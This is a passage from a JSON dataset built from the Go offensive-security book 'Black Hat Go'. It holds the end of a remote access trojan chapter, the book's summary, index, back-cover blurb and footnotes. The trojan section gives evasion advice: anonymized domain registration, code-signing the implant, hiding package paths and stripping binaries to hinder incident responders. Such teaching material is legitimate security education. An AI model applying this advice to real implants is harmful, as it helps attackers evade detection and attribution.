exec.Command() to create the\ncommand instance. You can alter the stdin and stdout\nproperties to redirect them appropriately. When used in\nconjunction with an io.Pipe, you can force the output of one\ncommand (ls -la, for example) to act as the input into a\nsubsequent command (wc -l).\nEnhance the Implant’s Authenticity and Practice\nGood OPSEC"
  },
  {
    "input": "Summary",
    "output": "Good OPSEC\nWhen you added encrypted communications to the implant in\nthe first exercise in this section, did you use a self-signed\ncertificate? If so, the transport and backend server may arouse\nsuspicion in devices and inspecting proxies. Instead, register a\ndomain name by using private or anonymized contact details\nin conjunction with a certificate authority service to create a\nlegitimate certificate. Further, if you have the means to do so,\nconsider obtaining a code-signing certificate to sign your\nimplant binary.\nAdditionally, consider revising the naming scheme for your\nsource code locations. When you build your binary file, the\nfile will include package paths. Descriptive pathnames may\nlead incident responders back to you. Further, when building\nyour binary, consider removing debugging information. This\nhas the added benefit of making your binary size smaller and\nmore difficult to disassemble. The following command can\nachieve this:\n$ go build -ldflags=\"-s -w\" implant/implant.go\nThese flags are passed to the linker to remove debugging\ninformation and strip the binary.\nAdd ASCII Art\nYour implementation could be a hot mess, but if it has ASCII\nart, it’s legitimate. Okay, we’re not serious about that. But\nevery security tool seems to have ASCII art for some reason,\nso maybe you should add it to yours. Greetz optional.\nSUMMARY\nGo is a great language for writing cross-platform implants,\nlike the RAT you built in this chapter. Creating the implant\nwas likely the most difficult part of this project, because using\nGo to interact with the underlying operating system can be\nchallenging compared to languages designed for the operating\nsystem API, such as C# and the Windows API. Additionally,\nbecause Go builds to a statically compiled binary, implants\nmay result in a large binary size, which may add some\nrestrictions on delivery.\nBut for backend services, there is simply nothing better.\nOne of the authors of this book (Tom) has an ongoing bet with\nanother author (Dan) that if he ever switches from using Go\nfor backend services and general utility, he’ll have to pay\n$10,000. There is no sign of him switching anytime soon\n(although Elixir looks cool). Using all the techniques\ndescribed in this book, you should have a solid foundation to\nstart building some robust frameworks and utilities.\nWe hope you enjoyed reading this book and participating\nin the exercises as much as we did writing it. We encourage\nyou to keep writing Go and use the skills learned in this book\nto build small utilities that enhance or replace your current\ntasks. Then, as you gain experience, start working on larger\ncodebases and build some awesome projects. To continue\ngrowing your skills, look at some of the more popular large\nGo projects, particularly from large organizations. Watch talks\nfrom conferences, such as GopherCon, that can guide you\nthrough more advanced topics, and have discussions on pitfalls\nand ways to enhance your programming. Most importantly,\nhave fun—and if you build something neat, tell us about it!\nCatch you on the flippity-flip."
  },
  {
    "input": "Index",
    "output": "INDEX\nA\nA records, 104, 109–111\nAbstract Syntax Notation One (ASN.1) encoding, 133–135,\n137–138\nacme/autocert, 235\nAdd(int), 27\nAddress Resolution Protocol (ARP) poisoning, 178\nAdvanced Encryption Standard (AES) algorithm, 242\nancillary chunks, 302\nanonymous functions, 126\nAPI interaction\noverview, 51–53\nBing scraping, 68–76\nMetasploit, 59–68\nShodan, 51–59\nAPIInfo struct, 55\nappend() function, 11\nARP (Address Resolution Protocol) poisoning, 178\nASN.1 (Abstract Syntax Notation One) encoding, 133–135,\n137–138\nassembly, 216\nasymmetric algorithms, 234\nasymmetric cryptography, 245. See also encryption\nAtom, GitHub, 4–5\nHivaNetwork.Com\nauthentication, 67, 86–88, 239–241\nB\nbackticks, 19\nbase workspace directory, 2\nBase64 encoding, 215–216\nbcrypt hashing, 235, 237–239\nBeacon, 121\nBerkeley Packet Filter (BPF), 175, 181. See also tcpdump\nbest practices\ncoding, 19, 49, 66, 185, 195, 329\nsecurity, 96, 236\nbin directory, 2\nbinaries, 2\nbinary data handling, 213–216\nBing, 68–76\nbodyType parameter, 46\nbraces, 14\nbreak statements, 14\nbrute force, 252–261\nbuffer overflow fuzzing, 188–192\nbuffered channels, 29, 37–39\nbufio package, 38, 112–113, 197\nbuild command, 7\nbuild constraints, 7–8\nbyte slices, 19\nbytes package, 197\nC\nC, 201–212, 290–293\nC transform, 213\nCaddy Server, 127\n.Call() method, 273\ncanonical name (CNAME) records, 109–111\ncapture() function, 184\nCGO package, 291\nchannels, 16–17\nChecker interface, 220–222\nCipher Block Chaining (CBC) mode, 242\nciphertext, 234\ncleartext\noverview, 234\npasswords, 150\nsniffing, 178–180\nclient implants, 323–325, 327–329\nClient struct, 53–54\ncloned sites, 90–93\nClose() method, 25\nclosed ports, 22\nCmd, 41\nCNAME records, 109–111\nCobalt Strike, 118–124, 278\nCOFF File Header, 282–283\ncollision, 234\nCommand() function, 41\ncommands\nbuild command, 7\ncross-compiling, 7–8\ngo commands, 6–9\nset command, 3\ncomplex data types, 10–11\nconcurrency, 16–17, 37\nconcurrent scanning, 26–32\nConn, 35–38\nconnections, 24–25, 35, 327\nconstraints, 7–8\ncontrol structures, 14–16\nconvenience functions, 46–47, 140\nCopy() function, 40\ncreateChunkCRC() method, 304–305\nCreateRemoteThread() Windows function, 275–276\ncredential-harvesting attacks, 90–93\ncritical chunks, 302\ncross-compiling, 7–8\ncross-site scripting, 94\ncrypto package, 197, 235\ncryptography\noverview, 234–235\nhashing, 234–239\ncurl, 40, 79\nD\nData Directory, 285–287\ndata mapping, 71–73, 125\ndata types\nchannels, 16\nmaps, 11\nprimitive, 10–11\nslices, 11\ndatabase miners, 161–170\ndebug package, 197\ndecoder function, 300\ndecoding process, 308\ndecryption, 234. See also encryption\nDefaultServerMux, 78–79\ndefer, 49\nDELETE requests, 47–48\ndep tool, 9\ndevelopment environment set up, 1–10\nDial() method, 24\ndialects, 132–133\ndirectives, 19\nDirty COW, 201–204\nDNS clients, 104–117\nDNS proxies, 124–127\nDNS servers, 117–129\nDNS tunneling, 121\ndo loops, 15\nDocker, 90, 118–122, 154–158\ndocument metadata, 69\nDocument Object Model (DOM), 74\ndomain fronting, 98\nDOS Header, 281\nDWORD, 271\nE\necho servers, 32, 35–37\nEmpire, 121\nEncode() method, 65\nencodeDecode() function, 308\nencoding package, 197\nencoding process, 308\nencryption, 234, 242–252\nendianness function, 299\nerror handling, 17–18\nerror messages, 51\nExclusive OR (XOR), 307–312\nExecutable and Linkable Format (ELF), 203\nexploitation, 196–212\nexport address table (EAT), 279\nF\nfield tags, 19–20, 139\nfilesystems, 170–171\nfiletype filter, 73\nfiltered ports, 22\nfiltering search results, 73–76\nfirewalls, 22–23\nfixed field tag, 140\nFlusher, 42\nfmt package, 25\nFOCA, 69\nFoo struct, 19\nfor loop, 15\nformatting\ndata, 38, 113–114\nsource code, 9\nFrida, 278\nfully qualified domain name (FQDN), 104\nfuzzing, 188–196\nG\ngaping security holes, 41\nGet() function, 46\nget() HTTP function, 227–229\nGetLoadLibAddress() function, 275\nGetProcessAddress() Windows function, 275\ngetRegex() function, 163\nGetSchema() function, 163, 165\nGieben, Miek, 104\nGitHub Atom, 4–5\nGNU Compiler Collection (GCC), 290\ngo build command, 6–7\nGo DNS package, 104\ngo doc command, 8\ngo fmt command, 9\ngo get command, 8–9\nGo Playground execution environment, 10\ngo run command, 6\nGo Syntax\ncomplex data types, 10–11\nconcurrency, 16–17\ncontrol structures, 14–16\ndata types, 10–11\ninterface types, 13\nmaps, 11\npatterns, 12–14\npointers, 12\nprimitive data types, 10–11\nslices, 11\nstruct types, 12–13\ngo vet command, 9\nGOARCH constraint, 7–8\nGoLand, 5–6\ngolint command, 9\nGOOS constraint, 7–8\ngopacket package, 174\ngopacket/pcap subpackage, 174–175\nGOPATH environment variable, 2–3\ngoquery package, 69\ngorilla/mux package, 82–83, 84, 101\ngorilla/websocket package, 96\nGOROOT environment variable, 2–3\ngoroutines, 16–17, 26–32\ngRPC framework, 316–319\ngss package, 138\nH\nHandleFunc() method, 82\nhandler() function, 75–76\nhandles, 271. See also tokens\nhandshake process, 22–23\nhash-based authentication, 147–150\nhashing, 234–239\nHead() function, 46\nhead() HTTP function, 226–227\nhex transform, 214\nhexadecimal 198, 281, 297\nHMAC (Keyed-Hash Message Authentication Code) standard,\n240–241\nHolt, Matt, 127\nhost search, 55–57\nHTTP clients\noverview, 46–51\nBing scraping, 68–76\nMetasploit interaction, 59–68\nShodan interaction, 51–59\nHTTP servers\noverview, 78–90\ncredential-harvesting attacks, 90–93\nmultiplexing, 98–102\nWebSocket API (WebSockets), 93–98\nhttp.HandleFunc(), 78–79\nI\nif statements, 18\nimplant code, 323–325, 327–329\nimport address table (IAT), 279\nindexing metadata, 68–76\ninfinite loops, 37\ninit() function, 101\ninput/output (I/O) tasks, 32–35\ninstreamset filter, 73\nintegrated development environments (IDEs), 3–6\ninterface{} type, 97\ninterface types, 13\nio package, 32, 197\nio.Pipe() function, 43\nio.ReadCloser, 49\nio.Reader, 32–35, 46\nioutil.ReadAll() function, 49\nio.Writer, 32–35\nJ\nJava, 118–120\nJavaScript, 94–95\nJBoss, 198\nJetBrains GoLand, 5–6\njQuery package, 69\nJS Bin, 94\nJSON, 19, 50, 54, 139, 159\nK\nKerberos, 133\nKernel32.dll, 275\nKeyed-Hash Message Authentication Code (HMAC) standard,\n240–241\nkeylogging, 93–98\nKozierok, Charles M., 22\nL\nlab environments, 118–121\nlen field tag, 140\nlibraries, 2\nlightweight threads, 16–17\nloadLibraryA() function, 275\nLogin() method, 66\nLogout() method, 66, 68\nloops, 15, 37\nLua plug-ins, 225–232\nHivaNetwork.Com\nLuhn checks, 253–254\nM\nmadvise() function, 205\nmagic bytes, 296\nmain() function, 17\nmain package, 6\nmake() function, 11\nMandatory Integrity Control, 271\nmapping data, 71–73, 125\nmaps, 11\nMarshal() method, 19\nmarshalData() method, 305\nmarshaling interfaces, 135\nMD5 hashes, 236–237\nmemory, 273–274\nmessage authentication, 239–241. See also authentication\nmessage authentication codes (MACs), 234\nMessagePack, 60\nmetadata, 69, 138–139\nMetasploit Framework, 59–68, 213\nMeterpreter, 61, 98–102\nMicrosoft API documentation, 263–265\nMicrosoft SQL (MSSQL) Server databases, 157–158,\n160–161\nMicrosoft Visual Studio Code, 5\nmiddleware, 80–81, 83–88\nMinGW-w64, 290\nmod tool, 9\nMongoDB databases, 154–156, 158–160\nMsfVenom, 213, 278\nMsg struct, 106–107\nMSYS2, 290\nmultichannel communication, 30–32\nmultiplexing, 98–102\nmutex, 129\nmutual authentication, 248–252\nMySQL databases, 156–157, 160–161\nN\nnamed functions, 126\nnative plug-ins, 218–224\nnegroni package, 83–88\nNessus vulnerability scanner, 217\nnet package, 24–25, 197\nNetcat, 40–44\nnet.Conn, 35\nnet/http standard package, 46, 48\nNew() helper function, 53–54\nNewProperties() function, 72–73\nNewRequest() function, 48\nNmap, 225\nnonconcurrent scanning, 25–26\nNoSQL databases, 154, 158\nNT LAN Manager (NTLM) authentication, 150–151\nNTLM Security Support Provider (NTLMSSP), 133–135\nNTOWFv2, 148\nnum transform, 214\nO\nobfuscation, 307\nOffice Open XML documents, 69\noffset field tag, 140\noffset values, 300\nomitempty, 62\nopen ports, 22\nOPSEC, 329\nOptional Header, 284–285\nOracle, 154\nos package, 197\nos/exec package, 41\nP\npackages, 2, 8–9\npacket capturing and filtering, 175–180\npanic() function, 107, 112\nparseTags() function, 140–142\npassive reconnaissance, 51, 59\npass-the-hash authentication, 147–150\npasswords, 146–151, 222–224\nPATCH requests, 47\npayloads, 101, 302–307\npcap, 175\nPDF files, 69\nPE (Portable Executable) format, 279–289\nPipeReader, 43\nPipeWriter, 43\nPKCS (Public Key Cryptography Standards), 242. See also\npublic-key cryptography\npkg directory, 2–3\nplaceholders, 83, 89\nPlan 9 operating system, 216\nplug-ins\nLua, 225–232\nnative, 218–224\nplugin package, 219\nPNG format, 296–307\npointers, 12\nPortable Executable (PE) format, 279–289\nPortable Network Graphics (PNG) images, 296–307\nports\navailability, 24–25\nhandshake process, 22\nport forwarding, 23, 39–40\nport scanners, 180–185, 222–224\nscanning, 23–32. See also scanners\nPost() function, 46–47\nPostForm() function, 47\nPostgres databases, 156–157, 160–161\nPostgreSQL databases, 156–157, 160–161\nPreProcessImage() function, 298\nprimitive data types, 10–11\nprocess() function, 72–73\nProcess Hacker, 278\nprocess injection, 268–269\nProcess Monitor, 278\nProcessImage() method, 302–303\nprocselfmem() function, 205\nproject structure, 52–53, 60\npromisc variable, 177\nProtocol Buffers (Protobuf), 316\nPsExec, 131\npublic-key cryptography, 242, 245. See also encryption\nPUT requests, 47–48\nPython, 197–201\nQ\nquery parameters, 73–76\nR\nrace condition functions, 206\nRapid7, 60\nRATs (remote access Trojans), 315–329\nraw transform, 215\nRC2, 252–261\nReadString() function, 38\nreconnaissance, 51, 59\nredirectors, 98\nreferential fields, 138–139\nreflect package, 139\nreflection, 132, 139\nregular expression (regex) values, 163\nremote access Trojans (RATs), 315–329\nremote procedure calls (RPCs), 59, 64–67, 316\nrequest/response cycles, 46, 62–64\nresponse handling, 48–51\nRivest, Ron, 252\nRLock, 129\nRoundcube, 90\nrouters, 79–80, 84–85\nrst packets, 22\nS\nsalts, 234\nscanner package, 220, 223\nscanners, 23–32, 180–185, 217, 222–224. See also ports\nschema-less databases, 154\nscraping metadata, 68–76\nSearch() function, 163\nsearch query templates, 73–76\nSection Table, 287–289\nsecurity tokens, 133–134\nsend() method, 65\nserveFile() function, 97\nServer Message Block (SMB), 132–147\nserver multiplexers, 78–79\nServerMux, 78–79\nSessionList() method, 66, 68\nset command, 3\nSHA-256 hashes, 236–237\nshellcode, 203–204, 213–216\nShodan, 51–59\nsignature validation, 245–248\nsite filter, 73\nslices, 11, 106, 126, 144–145\nSQL injection fuzzing, 192–196\nSQLite databases, 328\nsrc directory, 3\nstateless protocols, 46\nstatic files, 93\nStatus struct, 50–51\nsteganography\noverview, 295\nPNG format, 296–307\nXOR, 307–312\nstrconv package, 25\nstrlen() function, 17\nstrToInt() method, 304\nstructs\nAPIInfo struct, 55\nClient struct, 53–54\nencoding, 135\nFoo struct, 19\nhandling, 142–143\nMsg struct, 106–107\nStatus struct, 50–51\ntypes of, 12–13, 19, 133–135\nstructured data, 18–19, 50–51\nStub, 281\nsubdirectories, 2–3\nsubdomains, 107–117\nswitch statements, 14, 129, 143\nswitched networks, 178\nsymmetric algorithms, 234\nsymmetric-key encryption, 242–245. See also encryption\nSYN cookies, 180–185\nsyn packets, 22\nsyn-acks, 22\nSYN-flood protections, 180–185\nsyscall package, 197, 266–269\nSyscall6() function, 210\nT\ntabwriter package, 113–114\nTarget breach, 154\nTCP flags, 180–181\ntcpdump, 102, 105, 175–178\nTCP/IP Guide (Kozierok), 22\nteamservers, 121\nTelegram, 280\nTelnet, 41\ntemplates, 88–90\nTenable, 217\nthird-party packages, 8–9\ntokens, 61–63, 271\n“too fast” scanner, 26–27\nTour of Go tutorial, 10\nTransmission Control Protocol (TCP)\nhandshake process, 22–23\nport scanners, 23–32\nproxies, 32–44\nU\nUbuntu VM, 118–120\nuint16 data types, 143–144\nuintptr type, 266\nunicode package, 197\nunmarshal() function, 141–142\nUnmarshal() method, 19\nunmarshaling interfaces, 136\nunsafe package, 197\nunsafe.Pointer type, 266–267\nUSER property, 190\nutility programs, 67–68\nV\n{{variable-name}} convention, 89\nverbs, 47\nVim text editor, 3–4\nvim-go plug-in, 3\nvirtual machines (VMs), 118–120\nvirtual memory, 273–274\nVirtualAllocEx, 273–274\nVirtualFreeEx() Windows function, 277–278\nVMWare Workstation, 118–120\nVS Code, 5\nvulnerability fuzzers, 188–196\nW\nWaitforSingleObject() Windows function, 276–277\nwaitForWrite() function, 206\nWaitGroup, 27–28\nwalkFn() function, 171\nWebSocket API (WebSockets), 93–98\nwhile loops, 15\nWindows APIs, 263–265\nHivaNetwork.Com\nWindows DLL, 218–219\nWindows VM, 127\nwinmods files, 270\nWINNT.H header, 285–286\nWireshark, 102, 225\nworker functions, 28–30, 111–112\nwrapper functions, 136–137\nWriteData() function, 305–307, 311\nWriteProcessMemory() function, 274–275\nwriter.Flush() function, 38\nWriteString() function, 38\nX\nXML, 19–20, 69\nXOR, 307–312\nBlack Hat Go is set in New Baskerville, Futura, Dogma, and\nThe Sans Mono Condensed.\nUPDATES\nVisit https://nostarch.com/blackhatgo/ for updates, errata,\nand other information.\nMore no-nonsense books from NO STARCH\nPRESS\nREAL-WORLD BUG HUNTING\nA Field Guide to Web Hacking\nby PETER YAWORSKI\nJULY 2019, 264 PP., $39.95\nISBN 978-1-59327-861-8\nMALWARE DATA SCIENCE\nAttack Detection and Attribution\nby JOSHUA SAXE\nwith HILLARY SANDERS\nSEPTEMBER 2018, 272 PP., $49.95\nISBN 978-1-59327-859-5\nLINUX BASICS FOR HACKERS\nGetting Started with Networking, Scripting, and\nSecurity in Kali\nby OCCUPYTHEWEB\nDECEMBER 2018, 248 PP., $34.95\nISBN 978-1-59327-855-7\nSERIOUS CRYPTOGRAPHY\nA Practical Introduction to Modern Encryption\nby JEAN-PHILIPPE AUMASSON\nNOVEMBER 2017, 312 PP., $49.95\nISBN 978-1-59327-826-7\nGRAY HAT C#\nA Hacker’s Guide to Creating and Automating\nSecurity Tools\nby BRANDON PERRY\nJUNE 2017, 304 PP., $39.95\nISBN 978-1-59327-759-8\nPENTESTING AZURE APPLICATIONS\nThe Definitive Guide to Testing and Securing\nDeployments\nby MATT BURROUGH\nJULY 2018, 216 PP., $39.95\nISBN 978-1-59327-863-2\nPHONE:\n1.800.420.7240 OR\n1.415.863.9900\nEMAIL:\nSALES@NOSTARCH.COM\nWEB:\nWWW.NOSTARCH.COM\n“Everything necessary to get started with\nGo development in the security space”\n— HD Moore, Founder of the Metasploit\nProject and the Critical Research\nCorporation\nBlack Hat Go explores the darker side of Go, the popular\nprogramming language revered by hackers for its simplicity,\nefficiency, and reliability. It provides an arsenal of practical\ntactics from the perspective of security practitioners and\nhackers to help you test your systems, build and automate\ntools to fit your needs, and improve your offensive security\nskillset, all using the power of Go.\nYou’ll begin your journey with a basic overview of Go’s\nsyntax and philosophy and start to explore examples that you\ncan leverage for tool development, including common network\nprotocols like HTTP, DNS, and SMB. You’ll then dig into\nvarious tactics and problems that penetration testers encounter,\naddressing things like data pilfering, packet sniffing, and\nexploit development. You’ll create dynamic, pluggable tools\nbefore diving into cryptography, attacking Microsoft\nWindows, and implementing steganography.\nYou’ll learn how to:\nMake performant tools that can be used for your own\nsecurity projects\nCreate usable tools that interact with remote APIs\nScrape arbitrary HTML data\nUse Go’s standard package, net/http, for building HTTP\nservers\nWrite your own DNS server and proxy\nUse DNS tunneling to establish a C2 channel out of a\nrestrictive network\nCreate a vulnerability fuzzer to discover an application’s\nsecurity weaknesses\nUse plug-ins and extensions to future-proof products\nBuild an RC2 symmetric-key brute-forcer\nImplant data within a Portable Network Graphics (PNG)\nimage.\nAre you ready to add to your arsenal of security tools? Then\nlet’s Go!\nABOUT THE AUTHORS\nTom Steele, Chris Patten, and Dan Kottmann share over 30\nyears in penetration testing and offensive security experience,\nand have delivered multiple Go training and development\nsessions. (See inside for more details.)\nTHE FINEST IN GEEK ENTERTAINMENT™\nwww.nostarch.com\nHivaNetwork.Com\nFOOTNOTES\nCHAPTER 2. TCP, SCANNERS, AND\nPROXIES\n1. This is a free service provided by Fyodor, the creator of Nmap, but when you’re scanning, be polite.\nHe requests, “Try not to hammer on the server too hard. A few scans in a day is fine, but don’t scan 100\ntimes a day.”\nCHAPTER 3. HTTP CLIENTS AND\nREMOTE INTERACTION WITH\nTOOLS\n1. For assistance and practice with exploitation, consider downloading and running the Metasploitable\nvirtual image, which contains several exploitable flaws useful for training purposes.\nCHAPTER 5. EXPLOITING DNS\n1. Go versions 1.9 and newer contain a concurrent-safe type, sync.Map, that may be used to simplify\nyour code.\nCHAPTER 9. WRITING AND\nPORTING EXPLOIT CODE\n1. For more detailed information about this vulnerability, refer to\nhttps://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-\napplication-have-in-common-this-vulnerability/#jboss.\nCHAPTER 11. IMPLEMENTING AND\nATTACKING CRYPTOGRAPHY\n1. Some operating modes, such as Galois/Counter Mode (GCM), provide integrity assurance."
  }
]